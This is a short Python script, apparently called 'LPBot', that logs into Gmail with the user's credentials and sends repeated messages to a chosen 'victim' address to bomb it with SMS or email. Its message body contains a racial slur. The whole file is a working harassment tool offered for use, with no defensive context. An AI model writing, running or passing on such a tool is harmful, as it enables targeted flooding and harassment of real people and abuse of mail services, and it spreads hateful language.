from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.MIMEMultipart import MIMEMultipart
from email import Encoders
import smtplib


msg = MIMEMultipart()

email = raw_input("[LPBot] - Email: ")
passwd = raw_input("[LPBot] - Password: ")
atacante = email
victima = raw_input("[LPBot] - Victima (123@email): ")
threads = input("[LPBot] - Cantidad de SMS: ")

msg['From'] = atacante
msg['To'] = victima
msg['Subject'] = "You've been SMS-Bombed by LPBot"

msg.attach( MIMEText("#RIP NIGGA") )

for i in range(0,threads):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.ehlo()
	server.starttls()
	server.login(email, passwd)
	server.sendmail(atacante, victima, msg.as_string())
	print("[LPBot] Mensaje #" + str(i) + " ha sido mandado!")
	server.close()
